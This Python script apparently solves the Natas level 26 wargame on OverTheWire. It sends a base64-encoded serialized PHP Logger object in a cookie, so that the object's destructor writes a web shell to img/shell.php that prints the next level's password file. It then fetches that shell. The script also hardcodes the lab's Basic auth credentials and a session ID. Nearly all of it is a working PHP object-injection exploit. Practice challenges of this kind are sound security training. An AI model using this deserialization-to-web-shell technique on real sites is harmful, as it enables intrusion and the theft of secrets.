#!/usr/bin/python
import urllib
import urllib2
import binascii
import base64


# PHP code Generating Script
'''
<?php

    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg = "silence";
            $this->exitMsg = "<h1>YES! Its Working2</h1><?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/shell.php";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 

$object = new Logger('Bitforestinfo');


echo "Serialize [". serialize($object)."]";

echo "Base64 : [".base64_encode(serialize($object)). "]";

echo "\n\n";
?>

'''

# 
def request_generate(URL, SESSID, COOKIE=''):
    #print SESSID
    req = urllib2.Request(URL)
    req.add_header('User-Agent',  ' OOH! So You Want to know my USERAGENT ')
    req.add_header('Authorization', 'Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174; PHPSESSID={};'.format(SESSID) + COOKIE)
    return urllib2.urlopen(req)


# main function
def main():
    URL = 'http://natas26.natas.labs.overthewire.org/?x1=1&x2=1&y1=100&y2=100'
    SESSID='7b2q0fb8sshqljnrb79hitmno4';
    req = request_generate(URL, SESSID)
    h1, drawing_cookie = req.headers.dict['set-cookie'].split('=')
    drawing_cookie = urllib.unquote(drawing_cookie)
    drawing_cookie = base64.b64decode(drawing_cookie)
    print drawing_cookie
    #print req.read()

    # paste php base64 encoded string here
    drawing_cookie = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3NoZWxsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjc6InNpbGVuY2UiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo4ODoiPGgxPllFUyEgSXRzIFdvcmtpbmcyPC9oMT48P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=='
    #drawing_cookie = base64.b64encode(drawing_cookie)
    print "Base64 Encoded : ", drawing_cookie
    drawing_cookie = urllib.quote(drawing_cookie)
    print "Url Encode : ", drawing_cookie
    req = request_generate(URL, SESSID, " {}={} ".format(h1, drawing_cookie))
    print req.read()
    print req.info()
    print req.headers
    req = request_generate('http://natas26.natas.labs.overthewire.org/img/shell.php', SESSID)
    print req.read()


if __name__=='__main__':
    main()

